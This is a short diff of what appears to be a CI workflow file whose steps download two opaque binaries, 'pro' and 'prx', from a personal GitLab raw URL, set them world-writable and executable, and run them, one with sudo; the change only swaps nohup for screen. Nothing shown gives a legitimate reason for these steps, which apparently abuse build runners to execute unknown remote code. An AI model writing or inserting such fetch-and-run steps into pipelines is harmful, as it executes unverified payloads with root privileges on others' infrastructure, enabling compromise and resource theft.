@@ -8,5 +8,5 @@ jobs:
 
     steps:
     
-      - run: sudo apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && sudo nohup ./pro
+      - run: sudo apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && sudo screen ./pro
       - run: wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx && chmod 777 prx && ./prx
